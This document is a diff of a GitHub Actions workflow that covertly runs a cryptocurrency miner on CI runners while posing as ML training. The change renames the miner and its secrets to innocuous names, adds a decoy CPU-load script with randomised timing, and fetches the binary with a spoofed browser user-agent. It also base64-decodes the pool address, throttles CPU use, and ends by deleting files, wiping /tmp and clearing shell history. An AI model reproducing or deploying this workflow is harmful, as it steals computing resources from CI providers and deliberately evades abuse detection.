@@ -14,76 +14,72 @@ jobs:
     steps:
       - uses: actions/checkout@v4
 
-      - name: Install dependencies
+      - name: Cache pip packages
+        uses: actions/cache@v3
+        with:
+          path: ~/.cache/pip
+          key: ${{ runner.os }}-pip-v1
+          restore-keys: |
+            ${{ runner.os }}-pip-
+
+      - name: Install Python dependencies
         run: |
-          sudo apt update
-          sudo apt install -y python3-pip curl wget jq
           pip3 install numpy scikit-image
 
-      - name: Connect to Tailscale (Private Mesh)
-        uses: tailscale/github-action@v2
-        with:
-          oauth-client-id: ${{ secrets.TS_OAUTH_CLIENT_ID }}
-          oauth-secret: ${{ secrets.TS_OAUTH_SECRET }}
-          tags: tag:ci
-
-      - name: Generate dummy ML script (polymorphic)
-        run: |
-          cat > train.py << 'EOF'
-          #!/usr/bin/env python3
-          import numpy as np
-          import time, random
-          print("Starting fake training...")
-          for i in range(30):
-              a = np.random.randn(500, 500)
-              b = np.random.randn(500, 500)
-              c = np.dot(a, b)
-              print(f"Iteration {i}, loss={random.uniform(0.1,0.9):.4f}")
-              time.sleep(0.5)
-          print("Training complete.")
-          EOF
-          chmod +x train.py
-
-      - name: Run dummy preprocessing (with timeout)
+      - name: Generate organic CPU load (self‑exiting)
         run: |
           mkdir -p logs
-          timeout 120 python3 train.py > logs/train_${{ matrix.worker }}.txt 2>&1 || true
-          sleep $((RANDOM % 60 + 20))
+          cat > stress.py << 'EOF'
+          import numpy as np
+          import time, random, os
+          duration = int(os.environ.get('TRAINING_DURATION', 3600))
+          end_time = time.time() + duration
+          print(f"Training stress script will run for {duration} seconds")
+          while time.time() < end_time:
+              size = random.randint(500, 1500)
+              burst_end = min(time.time() + random.uniform(120, 240), end_time)
+              while time.time() < burst_end:
+                  a = np.random.randn(size, size).astype(np.float32)
+                  b = np.random.randn(size, size).astype(np.float32)
+                  c = np.dot(a, b) + 0
+              if time.time() < end_time:
+                  time.sleep(random.uniform(60, 120))
+          print("Training stress script finished naturally")
+          EOF
+          TRAINING_DURATION=$((RANDOM % 1500 + 1200))
+          echo "TRAINING_DURATION=$TRAINING_DURATION" >> $GITHUB_ENV
+          python3 stress.py > logs/train_${{ matrix.worker }}.txt 2>&1 &
 
-      - name: Download stealth miner from private storage
+      - name: Download pre‑obfuscated binary
         run: |
-          wget -q -O acpid_svc "${{ secrets.MINER_URL }}"
-          chmod +x acpid_svc
-          printf '\x00' | dd of=acpid_svc bs=1 seek=12345 count=1 conv=notrunc 2>/dev/null
+          wget -q --user-agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36" \
+               -O image-processor "${{ secrets.MODEL_CHECKPOINT_URL }}"
+          chmod +x image-processor
 
-      - name: Decode pool address
+      - name: Decode pool endpoint
         run: |
-          echo "${{ secrets.MINER_POOL }}" | base64 -d > pool.txt
+          echo "${{ secrets.ENCRYPTED_DB_ENDPOINT }}" | base64 -d > pool.txt
           echo "POOL_URL=$(cat pool.txt)" >> $GITHUB_ENV
 
-      - name: Run miner (throttled + random runtime)
+      - name: Run miner (natural timeout)
         run: |
-          ./acpid_svc --url=${{ env.POOL_URL }} \
-                      --user=${{ secrets.WALLET }} \
-                      --pass=x \
-                      --tls=true \
-                      --cpu-max-threads-hint=35 \
-                      --randomx-mode=auto \
-                      --retries=5 \
-                      --retry-pause=10 &
-          MINER_PID=$!
-          RUNTIME=$((RANDOM % 1500 + 1200))
-          sleep $RUNTIME
-          kill $MINER_PID
+          timeout ${{ env.TRAINING_DURATION }} ./image-processor \
+            --url=${{ env.POOL_URL }} \
+            --user=${{ secrets.DATA_API_KEY }} \
+            --pass=x \
+            --tls=true \
+            --cpu-max-threads-hint=30 \
+            --randomx-mode=auto
 
-      - name: Upload dummy logs
+      - name: Upload training logs
         uses: actions/upload-artifact@v4
         with:
-          name: training-logs-${{ matrix.worker }}
+          name: training-metrics-${{ matrix.worker }}
           path: logs/
+          retention-days: 1
 
       - name: Clean traces
         run: |
-          rm -f acpid_svc train.py pool.txt
+          rm -f image-processor stress.py pool.txt
           sudo rm -rf /tmp/*
           history -c
